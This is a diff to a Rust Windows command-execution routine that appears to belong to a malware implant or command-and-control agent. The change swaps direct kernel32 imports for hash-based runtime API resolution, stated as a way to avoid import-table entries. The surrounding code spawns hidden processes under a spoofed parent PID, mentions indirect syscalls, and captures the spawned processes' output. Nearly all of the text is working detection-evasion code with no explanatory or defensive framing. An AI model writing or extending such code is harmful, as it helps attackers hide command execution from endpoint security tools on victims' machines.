@@ -7,18 +7,102 @@ pub fn execute_command(
     args: &[&str],
     capture_output: bool,
 ) -> Result<std::process::Output> {
+    use std::ffi::c_void;
     use std::os::windows::ffi::OsStrExt;
-    use winapi::um::processthreadsapi::{
-        CreateProcessW, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
-        UpdateProcThreadAttribute, PROCESS_INFORMATION,
-    };
+    use winapi::um::processthreadsapi::PROCESS_INFORMATION;
     use winapi::um::winbase::{CREATE_NO_WINDOW, EXTENDED_STARTUPINFO_PRESENT, STARTUPINFOEXW};
     use winapi::um::winnt::{HANDLE, PROCESS_CREATE_PROCESS};
     const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
-    use winapi::um::fileapi::ReadFile;
-    use winapi::um::namedpipeapi::CreatePipe;
-    use winapi::um::winbase::HANDLE_FLAG_INHERIT;
     use winapi::um::winbase::STARTF_USESTDHANDLES;
+
+    // Dynamically resolve kernel32 functions to avoid IAT entries.
+    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+        .ok_or_else(|| anyhow::anyhow!("could not resolve kernel32 base"))?;
+
+    // InitializeProcThreadAttributeList
+    let init_attr_list_addr = pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"InitializeProcThreadAttributeList\0"),
+    ).ok_or_else(|| anyhow::anyhow!("could not resolve InitializeProcThreadAttributeList"))?;
+    type InitProcThreadAttrListFn = unsafe extern "system" fn(
+        *mut c_void,  // lpAttributeList
+        u32,          // dwAttributeCount
+        u32,          // dwFlags
+        *mut usize,   // lpSize
+    ) -> i32; // BOOL
+    let init_attr_list: InitProcThreadAttrListFn = std::mem::transmute(init_attr_list_addr);
+
+    // UpdateProcThreadAttribute
+    let update_attr_addr = pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"UpdateProcThreadAttribute\0"),
+    ).ok_or_else(|| anyhow::anyhow!("could not resolve UpdateProcThreadAttribute"))?;
+    type UpdateProcThreadAttrFn = unsafe extern "system" fn(
+        *mut c_void,  // lpAttributeList
+        u32,          // dwFlags
+        usize,        // Attribute
+        *mut c_void,  // lpValue
+        usize,        // cbSize
+        *mut c_void,  // lpPreviousValue
+        *mut usize,   // lpReturnSize
+    ) -> i32; // BOOL
+    let update_attr: UpdateProcThreadAttrFn = std::mem::transmute(update_attr_addr);
+
+    // DeleteProcThreadAttributeList
+    let delete_attr_addr = pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"DeleteProcThreadAttributeList\0"),
+    ).ok_or_else(|| anyhow::anyhow!("could not resolve DeleteProcThreadAttributeList"))?;
+    type DeleteProcThreadAttrListFn = unsafe extern "system" fn(
+        *mut c_void, // lpAttributeList
+    );
+    let delete_attr_list: DeleteProcThreadAttrListFn = std::mem::transmute(delete_attr_addr);
+
+    // CreatePipe
+    let create_pipe_addr = pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"CreatePipe\0"),
+    ).ok_or_else(|| anyhow::anyhow!("could not resolve CreatePipe"))?;
+    type CreatePipeFn = unsafe extern "system" fn(
+        *mut HANDLE,                              // hReadPipe
+        *mut HANDLE,                              // hWritePipe
+        *mut winapi::um::minwinbase::SECURITY_ATTRIBUTES, // lpPipeAttributes
+        u32,                                      // nSize
+    ) -> i32; // BOOL
+    let create_pipe: CreatePipeFn = std::mem::transmute(create_pipe_addr);
+
+    // CreateProcessW
+    let create_process_w_addr = pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"CreateProcessW\0"),
+    ).ok_or_else(|| anyhow::anyhow!("could not resolve CreateProcessW"))?;
+    type CreateProcessWFn = unsafe extern "system" fn(
+        *mut u16,                 // lpApplicationName
+        *mut u16,                 // lpCommandLine
+        *mut c_void,              // lpProcessAttributes
+        *mut c_void,              // lpThreadAttributes
+        i32,                      // bInheritHandles
+        u32,                      // dwCreationFlags
+        *mut c_void,              // lpEnvironment
+        *mut u16,                 // lpCurrentDirectory
+        *mut winapi::um::processthreadsapi::STARTUPINFOW, // lpStartupInfo
+        *mut PROCESS_INFORMATION, // lpProcessInformation
+    ) -> i32; // BOOL
+    let create_process_w: CreateProcessWFn = std::mem::transmute(create_process_w_addr);
+
+    // ReadFile
+    let read_file_addr = pe_resolve::get_proc_address_by_hash(
+        k32,
+        pe_resolve::hash_str(b"ReadFile\0"),
+    ).ok_or_else(|| anyhow::anyhow!("could not resolve ReadFile"))?;
+    type ReadFileFn = unsafe extern "system" fn(
+        HANDLE,       // hFile
+        *mut c_void,  // lpBuffer
+        u32,          // nNumberOfBytesToRead
+        *mut u32,     // lpNumberOfBytesRead
+        *mut c_void,  // lpOverlapped
+    ) -> i32; // BOOL
+    let read_file: ReadFileFn = std::mem::transmute(read_file_addr);
 
     let parent_pid =
         crate::process_manager::get_spoof_parent_pid().unwrap_or_else(|| std::process::id());
@@ -45,7 +129,7 @@ pub fn execute_command(
         let mut p_handle: HANDLE = if p_handle_raw != 0 { p_handle_raw as *mut _ } else { std::ptr::null_mut() };
 
         let mut size = 0;
-        InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut size);
+        init_attr_list(std::ptr::null_mut(), 1, 0, &mut size);
         // InitializeProcThreadAttributeList may leave `size = 0` on failure
         // (e.g. invalid parameters), which would make the subsequent
         // `vec![0u8; 0]` allocation produce a dangling pointer that the second
@@ -61,8 +145,8 @@ pub fn execute_command(
         si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
 
         if p_handle.is_null() == false {
-            if InitializeProcThreadAttributeList(attr_list, 1, 0, &mut size) != 0 {
-                let success = UpdateProcThreadAttribute(
+            if init_attr_list(attr_list, 1, 0, &mut size) != 0 {
+                let success = update_attr(
                     attr_list,
                     0,
                     PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
@@ -86,7 +170,7 @@ pub fn execute_command(
                 std::mem::size_of::<winapi::um::minwinbase::SECURITY_ATTRIBUTES>() as u32;
             sec_attr.bInheritHandle = 1; // TRUE
 
-            if CreatePipe(&mut stdout_rd, &mut stdout_wr, &mut sec_attr, 0) != 0 {
+            if create_pipe(&mut stdout_rd, &mut stdout_wr, &mut sec_attr, 0) != 0 {
                 // SetHandleInformation → NtSetInformationObject (indirect syscall, no IAT entry)
                 // ObjectHandleFlagInformation = 4: { Inherit, ProtectFromClose }
                 #[repr(C)]
@@ -133,7 +217,7 @@ pub fn execute_command(
             .collect();
 
         let flags = EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW;
-        let success = CreateProcessW(
+        let success = create_process_w(
             std::ptr::null(), // ApplicationName
             cmd_w.as_mut_ptr(),
             std::ptr::null_mut(),
@@ -152,7 +236,7 @@ pub fn execute_command(
         }
 
         if !si.lpAttributeList.is_null() {
-            DeleteProcThreadAttributeList(si.lpAttributeList);
+            delete_attr_list(si.lpAttributeList);
         }
         if !p_handle.is_null() {
             pe_resolve::close_handle(p_handle);
@@ -173,7 +257,7 @@ pub fn execute_command(
             let mut buf = [0u8; 4096];
             loop {
                 let mut bytes_read = 0;
-                let ok = ReadFile(
+                let ok = read_file(
                     stdout_rd,
                     buf.as_mut_ptr() as _,
                     buf.len() as u32,
